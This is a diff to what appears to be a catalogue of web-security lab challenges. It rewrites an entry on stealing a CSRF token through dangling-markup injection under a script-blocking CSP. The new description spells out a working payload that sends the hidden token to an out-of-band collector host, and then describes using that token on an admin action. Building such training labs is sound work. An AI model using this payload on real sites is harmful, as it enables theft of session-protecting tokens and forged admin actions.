@@ -1065,7 +1065,7 @@
         "slug": "dangling-markup-csrf-token-exfil",
         "title": "Dangling Markup — Stealing a CSRF Token Without Executing JS",
         "difficulty": "expert",
-        "description": "The app strips angle brackets from every user input but you can inject inside an existing HTML attribute (a URL context) that precedes a hidden CSRF token further down the DOM. The template renders unquoted attributes in one branch. Strict CSP blocks all inline and remote scripts.",
+        "description": "A staff review page reflects ?u= RAW into an UNQUOTED attribute on a single-line template, under CSP script-src 'none' (no JS), with a hidden CSRF token further along the same line. A dangling injection x><img src='http://collector:9000/leak?d= leaves a single-quoted src open that swallows the source line (including value=<token>) up to the next quote; the browser fetches it, leaking the token to the collector with no script. The leaked token authorises POST /admin/action, then /solve returns the flag. (Single-line render is required: Chrome's dangling-markup mitigation blocks a URL formed across a newline — verified live.)",
         "objective": "Inject dangling markup that causes the browser to include the trailing DOM (containing the CSRF token) inside a resource URL sent to the OOB collector.",
         "flag_hint": "OOB collector receives the token; /solve returns the flag when the value matches the current admin CSRF token.",
         "skills_taught": [
@@ -1075,14 +1075,15 @@
           "using resource fetches as an exfil channel"
         ],
         "tech_stack": [
-          "Go 1.23",
-          "Echo v4",
-          "html/template with inconsistent quoting on one attribute",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "raw reflection into an UNQUOTED attribute on a single-line template + CSP script-src 'none'",
+          "hidden CSRF token in an <input value> (captured as source text by the dangling markup)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
-        "inspired_by": "Michał Zalewski dangling-markup research and Krzysztof Kotowicz's 'Reverse Tabnabbing / dangling markup' 2016 talk"
+        "inspired_by": "The dangling-markup / trailing-markup injection technique (Michal Zalewski / Gareth Heyes / PortSwigger dangling-markup research) for scriptless data theft under a script-blocking CSP, abstracted for local Docker with a Flask reflect-into-unquoted-attribute page, a Playwright admin bot, and an OOB collector"
       },
       {
         "slug": "content-type-sniff-stored-nonce-leak-chain",
